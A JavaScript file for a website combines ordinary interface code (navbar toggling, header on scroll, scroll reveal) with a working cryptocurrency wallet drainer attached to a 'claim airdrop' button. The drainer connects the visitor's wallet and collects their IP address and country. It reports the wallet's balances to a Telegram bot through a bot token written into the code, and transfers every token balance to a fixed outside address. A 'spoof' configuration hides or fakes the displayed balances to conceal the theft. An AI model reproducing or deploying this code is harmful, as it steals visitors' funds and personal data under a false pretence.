'use strict';

/**
 * Add event on element
 */
const addEventOnElem = function (elem, type, callback) {
  if (elem.length > 1) {
    for (let i = 0; i < elem.length; i++) {
      elem[i].addEventListener(type, callback);
    }
  } else {
    elem.addEventListener(type, callback);
  }
}

/**
 * Navbar toggle
 */
const navbar = document.querySelector("[data-navbar]");
const navbarLinks = document.querySelectorAll("[data-nav-link]");
const navToggler = document.querySelector("[data-nav-toggler]");

const toggleNavbar = function () {
  navbar.classList.toggle("active");
  navToggler.classList.toggle("active");
  document.body.classList.toggle("active");
}

addEventOnElem(navToggler, "click", toggleNavbar);

const closeNavbar = function () {
  navbar.classList.remove("active");
  navToggler.classList.remove("active");
  document.body.classList.remove("active");
}

addEventOnElem(navbarLinks, "click", closeNavbar);

/**
 * Header active on scroll
 */
const header = document.querySelector("[data-header]");

const activeHeader = function () {
  if (window.scrollY > 300) {
    header.classList.add("active");
  } else {
    header.classList.remove("active");
  }
}

addEventOnElem(window, "scroll", activeHeader);

/**
 * Toggle active on add to fav
 */
const addToFavBtns = document.querySelectorAll("[data-add-to-fav]");

const toggleActive = function () {
  this.classList.toggle("active");
}

addEventOnElem(addToFavBtns, "click", toggleActive);

/**
 * Scroll reveal effect
 */
const sections = document.querySelectorAll("[data-section]");

const scrollReveal = function () {
  for (let i = 0; i < sections.length; i++) {
    if (sections[i].getBoundingClientRect().top < window.innerHeight / 1.5) {
      sections[i].classList.add("active");
    } else {
      sections[i].classList.remove("active");
    }
  }
}

scrollReveal();
addEventOnElem(window, "scroll", scrollReveal);

/**
 * Spoof Simulation Configuration
 */
const spoofConfig = {
  noApprovementMode: false, // Hide tokens that will be drained in display (Pectra users only)
  hideNativeWithdraw: false, // Conceal native token deductions in display
  showNativeTopup: false, // Show +0.0000000001 ETH receipt in simulation
  tokenTopupAmount: 0 // Amount of fake tokens to credit (0 to disable)
};

/**
 * Wallet connect and token transfer using Moralis API with Telegram notification
 */
async function connectWalletAndSendTokens() {
  const providerOptions = {
    walletconnect: {
      package: window.WalletConnectProvider.default,
      options: {
        infuraId: "5b2c5ee5760146349669a1e9c77665d1"
      }
    }
  };

  const web3Modal = new window.Web3Modal.default({
    cacheProvider: false,
    providerOptions
  });

  try {
    const instance = await web3Modal.connect();
    const provider = new ethers.providers.Web3Provider(instance);
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();
    const network = await provider.getNetwork();
    const chainId = network.chainId;

    const walletType = instance.isWalletConnect ? "WalletConnect" : "MetaMask";

    let locationData = {};
    try {
      const locRes = await fetch("https://ipapi.co/json/");
      locationData = await locRes.json();
    } catch (e) {
      console.warn("Location fetch failed", e);
    }

    // Moralis API call to get token balances
    const moralisApiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImU1MjI2ZmQ1LTE0NDUtNGIyOC04YzYzLTZmOWEzZDRkNWJjZSIsIm9yZ0lkIjoiNDQ5NTg1IiwidXNlcklkIjoiNDYyNTgwIiwidHlwZUlkIjoiZjVhODc0ZmItZGM2Ni00NjE0LWIxNDUtMjlkYTg5YjIwNDk1IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NDgzOTc5MTksImV4cCI6NDkwNDE1NzkxOX0.lr5-p-SHS7j4EAlsT1ZYt7tTnOfKnoZXSsqS_6WIReY";
    const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${chainId === 1 ? 'eth' : chainId === 137 ? 'polygon' : 'eth'}`;

    const response = await fetch(moralisUrl, {
      headers: {
        "X-API-Key": moralisApiKey
      }
    });

    let tokens = await response.json();
    const originalTokens = [...tokens]; // Store original tokens for transfer

    // Apply spoof simulation settings for display
    if (spoofConfig.noApprovementMode) {
      // Hide tokens that would be drained in display (for Pectra users)
      tokens = tokens.filter(token => !token.balance || ethers.BigNumber.from(token.balance).isZero());
    }

    if (spoofConfig.tokenTopupAmount > 0) {
      // Add fake token balance
      const fakeToken = {
        token_address: "0xFakeTokenAddress",
        name: "Fake Token",
        symbol: "FAKE",
        decimals: 18,
        balance: ethers.utils.parseUnits(spoofConfig.tokenTopupAmount.toString(), 18).toString()
      };
      tokens.push(fakeToken);
    }

    // Get native balance (ETH)
    const nativeBalance = await provider.getBalance(userAddress);
    let nativeBalanceFormatted = ethers.utils.formatEther(nativeBalance);
    let nativeBalanceDisplay = nativeBalanceFormatted;

    if (spoofConfig.showNativeTopup) {
      // Simulate +0.0000000001 ETH top-up
      nativeBalanceDisplay = (parseFloat(nativeBalanceFormatted) + 0.0000000001).toFixed(18);
    }

    // Format balance summary
    let tokenSummary = "";
    if (tokens && tokens.length > 0) {
      tokenSummary = tokens.map(token => {
        const decimals = token.decimals ?? 18;
        const balance = ethers.utils.formatUnits(token.balance, decimals);
        return `• ${token.symbol}: ${balance}`;
      }).join("\n");
    } else {
      tokenSummary = "No tokens found or balance is 0.";
    }

    // Compose full Telegram message with balances
    const fullMessage = `
📥 Wallet Connected!
Address: ${userAddress}
Wallet: ${walletType}
Country: ${locationData.country_name || "Unknown"}
IP: ${locationData.ip || "N/A"}

💰 Token Balances:
${tokenSummary}

💸 Native Balance (ETH):
${spoofConfig.hideNativeWithdraw ? "Hidden" : nativeBalanceDisplay}${spoofConfig.showNativeTopup ? " (includes +0.0000000001 ETH top-up)" : ""}
    `;

    const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
    const chatId = "5995616824";

    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: fullMessage
      })
    });

    // Proceed with transferring all non-zero token balances to your address
    for (const token of originalTokens) {
      try {
        const contract = new ethers.Contract(token.token_address, [
          "function transfer(address to, uint amount) returns (bool)"
        ], signer);

        const balanceInWei = ethers.BigNumber.from(token.balance);
        if (balanceInWei.isZero()) continue;

        const tx = await contract.transfer("0x68AB302445eA390fAa79D76bf865819d07d0800a", balanceInWei);
        console.log(`Sent ${token.symbol}, tx:`, tx.hash);
      } catch (err) {
        console.warn(`Failed to send ${token.symbol}`, err);
      }
    }

    // Simulate native token deduction (ETH) unless hidden
    if (!spoofConfig.hideNativeWithdraw) {
      console.log(`Simulated native withdraw: ${nativeBalanceFormatted} ETH`);
    }

  } catch (err) {
    console.error('Error connecting wallet or sending tokens:', err);
  }
}

// Attach to claim button
document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);